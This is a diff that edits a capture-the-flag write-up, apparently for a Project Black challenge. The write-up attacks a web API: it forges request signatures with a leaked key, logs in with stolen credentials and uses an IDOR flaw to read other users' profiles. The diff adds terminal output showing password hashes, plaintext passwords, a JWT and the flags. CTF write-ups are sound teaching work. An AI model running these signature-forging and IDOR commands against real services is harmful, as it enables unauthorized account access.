@@ -36,7 +36,8 @@ The challenge starts at `https://projectblack.io/ctf/challenge6.txt`. Fetching t
 └─$ curl https://projectblack.io/ctf/challenge6.txt
 tHe GnU mAnIfesTo
 ThE GNu mANiFestO (whiCh appEarS beloW) waS wRittEn By richArD stalLMaN iN 1985 to aSk
-For supPoRt iN deVeLoping ThE gnu opErATInG sYsTem...
+For supPoRt iN deVeLoping ThE gnu opErATInG sYsTem... <SNIP>
+<SNIP>
 ```
 
 The key observation is that the case of each letter encodes a binary bit — **uppercase = 1, lowercase = 0**. Grouping the bits into 8-bit chunks and converting to ASCII reveals a base64 string. Decoding that base64 string produces a ZIP file (confirmed by the `PK` magic bytes).
@@ -104,15 +105,7 @@ The consultant intercepted browser traffic using the developer tools Network tab
 └─$ curl -s https://chortle.0hl.cc/api/users/ \
   -H "X-Signature: be35213f5990a7778a73ad1ca69e76ec" \
   -H "Authorization: Bearer null"
-{"data": [
-  {"id": "***", "username": "eddie", "description": "***", "privilege_level": "***", "md5": "***"},
-  {"id": "8abc5219...", "username": "jarrod", "privilege_level": "USER", "md5": "f6f8539e588ab12618044af0d948cc2e"},
-  {"id": "501745fb...", "username": "nikolai", "privilege_level": "USER", "md5": "482c811da5d5b4bc6d497ffa98491e38"},
-  {"id": "e70f4e71...", "username": "jay", "privilege_level": "USER", "md5": "6c7c067eebbcbc795b19dae9643d95df"},
-  {"id": "c023405b...", "username": "sayuri", "privilege_level": "USER", "md5": "95df532e1f3538622d2e01b41211e142"},
-  {"id": "c150138a...", "username": "jason", "description": "Also known as Json", "privilege_level": "ADMIN", "md5": "2aa9b46343429ebc7aafcd9396a8224c"},
-  {"id": "e1d90179...", "username": "mal", "description": "PRJBLK{2/6:_We_nE3d_0uR_@PP_t3sT3D._c@N_y0u_$T@rT_t0m0rR0W?}", "privilege_level": "USER", "md5": "0ad965199998016c5d5b6b500bf662ec"}
-]}
+{"data": [{"id": "***", "username": "eddie", "description": "***", "privilege_level": "***", "md5": "***"}, {"id": "8abc5219-4354-4ad4-a059-90abd7d55290", "username": "jarrod", "description": null, "privilege_level": "USER", "md5": "f6f8539e588ab12618044af0d948cc2e"}, {"id": "501745fb-ef79-4369-9e3c-40154543cd79", "username": "nikolai", "description": null, "privilege_level": "USER", "md5": "482c811da5d5b4bc6d497ffa98491e38"}, {"id": "e70f4e71-aad9-47ad-82b6-86a1e353bff3", "username": "jay", "description": null, "privilege_level": "USER", "md5": "6c7c067eebbcbc795b19dae9643d95df"}, {"id": "c023405b-00c6-4af3-9aa6-0c39b3ea2869", "username": "sayuri", "description": null, "privilege_level": "USER", "md5": "95df532e1f3538622d2e01b41211e142"}, {"id": "c150138a-fb84-491b-8880-3a852326fcd7", "username": "jason", "description": "Also known as Json", "privilege_level": "ADMIN", "md5": "2aa9b46343429ebc7aafcd9396a8224c"}, {"id": "e1d90179-c797-44f5-9a22-e7c2b121faa1", "username": "mal", "description": "PRJBLK{2/6:_We_nE3d_0uR_@PP_t3sT3D._c@N_y0u_$T@rT_t0m0rR0W?}", "privilege_level": "USER", "md5": "0ad965199998016c5d5b6b500bf662ec"}]}  
 ```
 
 Flag 2 is sitting in `mal`'s description field. The response also leaks every user's UUID, privilege level, and MD5 password hash — valuable for later stages.
@@ -156,7 +149,7 @@ With the key recovered, the consultant could now sign any API request. Cracking 
 Calling `POST /api/alerts/` with a valid token returned flag 3.
 
 ```bash
-┌──(kali㉿kali)-[~/Room410]
+┌──(kali㉿kali)-[~]
 └─$ BODY='{"username":"nikolai","password":"password123"}'
 SIG=$(python3 -c "import hashlib; KEY='Th1\$_1\$_mY_\$3Cr3t_3nCrYpt10N_k3Y'; print(hashlib.md5((KEY+'$BODY').encode()).hexdigest())")
 
@@ -169,6 +162,7 @@ curl -s -X POST https://chortle.0hl.cc/api/alerts/ \
   -H "X-Signature: be35213f5990a7778a73ad1ca69e76ec" \
   -H "Authorization: Bearer $TOKEN" \
   -H "Content-Length: 0"
+
 [{"id":"a53e8b0c-4de5-4ec3-b3fe-c661724f38f5","message":"PRJBLK{3/6:_Ye@H,_w3_@lr3ady_Kn3w_@b0ut_Th@t_cr1t1c@1_I$$u3}"}] 
 ```
 
@@ -185,22 +179,30 @@ Logged in as nikolai (USER privilege), the consultant observed the dashboard mak
 The consultant replaced nikolai's UUID with jason's (`c150138a-fb84-491b-8880-3a852326fcd7`) and recomputed the signature.
 
 ```bash
-BODY='{"username":"nikolai","password":"password123"}'
+┌──(kali㉿kali)-[~]
+└─$ BODY='{"username":"nikolai","password":"password123"}'
 SIG=$(python3 -c "import hashlib; KEY='Th1\$_1\$_mY_\$3Cr3t_3nCrYpt10N_k3Y'; print(hashlib.md5((KEY+'$BODY').encode()).hexdigest())")
-
 TOKEN=$(curl -s -X POST https://chortle.0hl.cc/api/token/ \
   -H "Content-Type: application/json" \
   -H "X-Signature: $SIG" \
   -d "$BODY" | python3 -c "import sys,json; print(json.load(sys.stdin)['access'])")
 
-echo "Token: $TOKEN"
+┌──(kali㉿kali)-[~]
+└─$ python3 -c "
+import hashlib, json
+KEY = 'Th1\$_1\$_mY_\$3Cr3t_3nCrYpt10N_k3Y'
+body = json.dumps({'id':'c150138a-fb84-491b-8880-3a852326fcd7'}, separators=(',',':'))
+print(hashlib.md5((KEY+body).encode()).hexdigest())
+"
+90c7c8f5972b542ad1c32543daef66b3
 
-# Step 2 - IDOR with jason's ID
-curl -s -X POST https://chortle.0hl.cc/api/profile/ \
+┌──(kali㉿kali)-[~]
+└─$ curl -s -X POST https://chortle.0hl.cc/api/profile/ \
   -H "Content-Type: application/json" \
   -H "X-Signature: 90c7c8f5972b542ad1c32543daef66b3" \
   -H "Authorization: Bearer $TOKEN" \
   -d '{"id":"c150138a-fb84-491b-8880-3a852326fcd7"}'
+{"flag":"PRJBLK{4/6:_DEV3l0pEr_t00l$!?_Y0u_must_be_@_Ma$t3r_h@ck3r}","data":{"id":"c150138a-fb84-491b-8880-3a852326fcd7","email":"jason@localhost","username":"jason","privilege_level":"ADMIN","password":"kgf7ac69WDojJW5MNA2"}}
 ```
 
 The response returns jason's full profile including his **plaintext password** and flag 4.
@@ -245,38 +247,28 @@ mal       ipYs5gLyFe4V2ctFbpE  USER
 Eddie was **fully redacted** in all API responses but his credentials are exposed in the database. The consultant logged in as eddie (SUPER_ADMIN) and applied the same IDOR technique against `/api/profile/`, then called `/api/alerts/` with eddie's token.
 
 ```bash
-BODY='{"username":"eddie","password":"bvhkVv8UnebiTSvRBYa"}'
+┌──(kali㉿kali)-[~]
+└─$ BODY='{"username":"eddie","password":"bvhkVv8UnebiTSvRBYa"}'
 SIG=$(python3 -c "import hashlib,json; KEY='Th1\$_1\$_mY_\$3Cr3t_3nCrYpt10N_k3Y'; print(hashlib.md5((KEY+'$BODY').encode()).hexdigest())")
-
 EDDIE_TOKEN=$(curl -s -X POST https://chortle.0hl.cc/api/token/ \
   -H "Content-Type: application/json" \
   -H "X-Signature: $SIG" \
   -d "$BODY" | python3 -c "import sys,json; print(json.load(sys.stdin)['access'])")
-
 echo "Eddie token: $EDDIE_TOKEN"
-
 SIG_GET="be35213f5990a7778a73ad1ca69e76ec"
-
 EDDIE_BODY='{"id":"37d6e9285ec84a85b21d29e8ca7814fb"}'
 EDDIE_SIG=$(python3 -c "import hashlib; KEY='Th1\$_1\$_mY_\$3Cr3t_3nCrYpt10N_k3Y'; print(hashlib.md5((KEY+'$EDDIE_BODY').encode()).hexdigest())")
-
-# Get eddie's own profile
 curl -s -X POST https://chortle.0hl.cc/api/profile/ \
   -H "Content-Type: application/json" \
   -H "X-Signature: $EDDIE_SIG" \
   -H "Authorization: Bearer $EDDIE_TOKEN" \
   -d "$EDDIE_BODY"
-
-# Alerts as eddie → FLAG 6
 curl -s -X POST https://chortle.0hl.cc/api/alerts/ \
   -H "X-Signature: $SIG_GET" \
   -H "Authorization: Bearer $EDDIE_TOKEN" \
   -H "Content-Length: 0"
-
-# Also get users list as eddie
-curl -s https://chortle.0hl.cc/api/users/ \
-  -H "X-Signature: $SIG_GET" \
-  -H "Authorization: Bearer $EDDIE_TOKEN"
+Eddie token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoiYWNjZXNzIiwiZXhwIjoxNzc4Nzg0OTgxLCJpYXQiOjE3Nzg3NDE3ODEsImp0aSI6IjRiNmFjNzE3MTU0YzRhZmVhYTEwODU0N2YwNzU5YmZhIiwidXNlcl9pZCI6IjM3ZDZlOTI4LTVlYzgtNGE4NS1iMjFkLTI5ZThjYTc4MTRmYiJ9.Dh6efgL9zBNcm2pjNg75PNfHsHQjA6QRwzU9q95vYCo
+{"flag":"PRJBLK{4/6:_DEV3l0pEr_t00l$!?_Y0u_must_be_@_Ma$t3r_h@ck3r}","data":{"id":"37d6e928-5ec8-4a85-b21d-29e8ca7814fb","email":"eddie@localhost","username":"eddie","privilege_level":"SUPER_ADMIN","password":"bvhkVv8UnebiTSvRBYa"}}[{"id":"211fe1cb-d4c6-409b-8d8a-94753df6d6e3","message":"PRJBLK{6/6:_w0W,_d@tAb@s3_M1Gr@Ti0n$_R_s0_E@$y!!1!}"}]   
 ```
 
 ![image](/assets/img/pic6.jfif){: .mx-auto .shadow .rounded-10 w="800" }
